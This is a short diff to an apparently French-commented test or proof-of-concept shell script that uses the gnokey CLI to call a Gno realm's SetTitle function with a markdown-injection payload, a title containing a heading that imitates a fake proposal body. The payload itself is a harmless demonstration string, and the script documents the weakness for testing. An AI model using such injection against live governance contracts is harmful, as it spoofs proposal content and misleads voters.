@@ -51,23 +51,16 @@ if echo "$DEPLOY" | grep -q "OK!"; then echo "OK"; else
 fi
 
 # --- injection du payload malicieux ---
-cat > "$TMPDIR/inject.gno" << EOF
-package main
-
-import realm "${PKGPATH}"
-
-func main() {
-	realm.SetTitle("Proposition legitime\n\n# INJECTED: Faux corps de proposition\n\nContenu malicieux injecte par l'attaquant.")
-}
-EOF
-
 echo -n "   Injecting malicious title... "
-INJECT=$(echo "$PASSWORD" | gnokey maketx run \
+INJECT=$(echo "$PASSWORD" | gnokey maketx call \
+	-pkgpath "$PKGPATH" \
+	-func "SetTitle" \
+	-args "Proposition legitime\n\n# INJECTED: Faux corps de proposition\n\nContenu malicieux injecte par l'attaquant." \
 	-gas-fee 1000000ugnot -gas-wanted 5000000 \
 	-broadcast -chainid "$CHAINID" -remote "$RPC" \
 	-insecure-password-stdin \
 	-home "$GNOKEY_HOME" \
-	"$KEY" "$TMPDIR/inject.gno" 2>&1)
+	"$KEY" 2>&1)
 if echo "$INJECT" | grep -q "OK!"; then echo "OK"; else
 	echo "FAILED"; echo "$INJECT"; exit 1
 fi
